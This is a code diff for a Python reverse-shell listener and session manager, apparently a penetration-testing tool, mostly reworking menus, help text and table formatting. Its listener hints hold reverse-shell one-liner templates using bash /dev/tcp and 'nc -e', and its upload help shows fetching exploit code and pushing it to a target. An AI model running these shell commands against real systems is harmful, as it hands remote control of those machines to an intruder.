@@ -129,6 +129,7 @@ class MainMenu(cmd.Cmd):
 				cmdlogger.debug(f"History file '{histfile}' does not exist")
 
 	def show(self):
+		print()
 		threading.Thread(target=self.cmdloop, name='Menu').start()
 
 	def set_id(self, ID):
@@ -184,6 +185,9 @@ class MainMenu(cmd.Cmd):
 			part = help_prompt.sub('', part)
 			modified_parts.append(part)
 		print(textwrap.indent("\n".join(modified_parts), '    '))
+
+		if command == 'run':
+			self.show_modules()
 
 	def do_help(self, command):
 		"""
@@ -356,10 +360,11 @@ class MainMenu(cmd.Cmd):
 
 		Examples:
 
-			upload /tools				Upload a directory
-			upload /tools/mysuperdupertool.sh	Upload a file
-			upload /tools/privesc*			Upload multiple files and directories using glob
-			upload https://github.com/x/y/z.sh	Download the file locally and then push it to the target
+			upload /tools					  Upload a directory
+			upload /tools/mysuperdupertool.sh		  Upload a file
+			upload /tools/privesc*				  Upload multiple files and directories using glob
+			upload https://github.com/x/y/z.sh		  Download the file locally and then push it to the target
+			upload https://www.exploit-db.com/exploits/40611  Download locally the underlying exploit code and upload it to the target
 		"""
 		if local_globs:
 			for glob in shlex.split(local_globs):
@@ -367,20 +372,22 @@ class MainMenu(cmd.Cmd):
 		else:
 			cmdlogger.warning("No files or directories specified")
 
+	def show_modules(self):
+		table = Table(joinchar=' <-> ')
+		table.header = [paint('MODULE NAME', 'cyan', 'UNDERLINE'), paint('DESCRIPTION', 'cyan', 'UNDERLINE')]
+		for name, info in options.modules.items():
+			table += [paint(name, 'red'), info['description']]
+		print("\n", table, "\n", sep="")
+
 	@session(current=True)
 	def do_run(self, module):
 		"""
 		[module name]
-		Run a module. Without module name it lists all modules
-		"""
+		Run a module. Run 'help run' to view the available modules"""
 		if module:
 			self.cmdqueue.extend(options.modules[module]['actions'][core.sessions[self.sid].OS])
 		else:
-			table = Table(joinchar=' <-> ')
-			table.header = [paint('NAME', 'cyan'), paint('DESCRIPTION', 'cyan')]
-			for name, info in options.modules.items():
-				table += [paint(name, 'red'), info['description']]
-			print("\n", table, "\n", sep="")
+			self.show_modules()
 
 	@session(current=True)
 	def do_spawn(self, line):
@@ -556,6 +563,7 @@ class MainMenu(cmd.Cmd):
 		if core.listeners:
 			print()
 			for listener in core.listeners:
+				print(paint(f"{listener} hints:", 'cyan', 'UNDERLINE'))
 				print(listener.hints, end='\n\n')
 		else:
 			cmdlogger.warning("No registered Listeners to show hints")
@@ -801,10 +809,10 @@ class Core:
 				elif readable.__class__ is Listener:
 
 					try:
-						socket, endpoint = readable.socket.accept()
+						_socket, endpoint = readable.socket.accept()
 						thread_name = f"IncomingConnection-{endpoint}"
 						logger.debug(f"New thread: {thread_name}")
-						threading.Thread(target=Session, args=(socket,*endpoint,readable),
+						threading.Thread(target=Session, args=(_socket, *endpoint, readable),
 							name=thread_name).start()
 
 					except OSError:
@@ -992,19 +1000,22 @@ class Listener:
 	@property
 	def hints(self):
 		presets = [
-			'bash -c "exec bash >& /dev/tcp/{}/{} 0>&1 &"',
-			'nc -e /bin/sh {} {}'
+			"bash -c 'exec bash >& /dev/tcp/{}/{} 0>&1 &'",
+			"nc -e cmd {} {}"
 		]
-		output = [paint(f"[{self} Hints] ===========---",'yellow')]
+
+		output = []
+		ips = [self.host]
 
 		if self.host == '0.0.0.0':
-			for ip in Interfaces().list.values():
-				output.extend([preset.format(paint(ip,'cyan','DIM'), self.port) for preset in presets])
-				output.append('')
-		else:
-			output.extend([preset.format(self.host,self.port) for preset in presets])
+			ips = [ip for ip in Interfaces().list.values()]
 
-		output[-1] = paint("[/Hints] ==========---",'yellow')
+		for ip in ips:
+			output.extend([preset.format(paint(ip, 'blue'),
+				paint(self.port, 'yellow', 'DIM')) for preset in presets])
+
+		output.append("─" * Table.real_len(max(output, key=Table.real_len)))
+
 		return '\n'.join(output)
 
 
@@ -1597,7 +1608,7 @@ class Session:
 		else:
 			print()
 			logger.warning("Session detached...")
-			print()
+			#print()
 
 		if self.id in core.sessions:
 			menu.set_id(self.id)
@@ -1668,6 +1679,7 @@ class Session:
 
 			if re.match('(http|ftp)s?://', local_item_path, re.IGNORECASE):
 
+				# URLs with special treatment
 				local_item_path = re.sub("https://www.exploit-db.com/exploits/",
 						"https://www.exploit-db.com/download/", local_item_path)
 
@@ -1888,6 +1900,10 @@ class Table:
 	def header(self, header):
 		self.add_row(header, header=True)
 
+	@staticmethod
+	def real_len(text):
+		return len(re.sub(r'\x1b\[\d+(;\d+)*m', '', text))
+
 	def __str__(self):
 		self.fill()
 		return "\n".join([self.joinchar.join(row) for row in self.data])
@@ -1910,7 +1926,7 @@ class Table:
 		new_row = []
 		for index, element in enumerate(row):
 			element = str(element)
-			elem_length = len(element)
+			elem_length = self.real_len(element)
 			new_row.append(element)
 			if elem_length > self.col_max_lens[index]:
 				self.col_max_lens[index] = elem_length
@@ -1926,12 +1942,12 @@ class Table:
 
 	def fill(self):
 		for row in self.data:
-			for index, elem in enumerate(row):
+			for index, element in enumerate(row):
 				fillchar = ' '
 				if index in [*self.fillchar][1:]:
 					fillchar = self.fillchar[0]
 
-				row[index] = elem + fillchar * (self.col_max_lens[index] - len(elem))
+				row[index] = element + fillchar * (self.col_max_lens[index] - self.real_len(element))
 
 
 class Color:
@@ -2168,8 +2184,12 @@ if __name__ == "__main__":
 		Connect(options.connect, options.ports[0])
 	else:
 		if options.ports:
-			for port in options.ports: Listener(port=port)
-			if options.plain: menu.show()
+			for port in options.ports:
+				Listener(port=port)
+			if options.plain:
+				menu.show()
 		else:
-			if options.plain: menu.show()
-			else: Listener()
+			if options.plain:
+				menu.show()
+			else:
+				Listener()
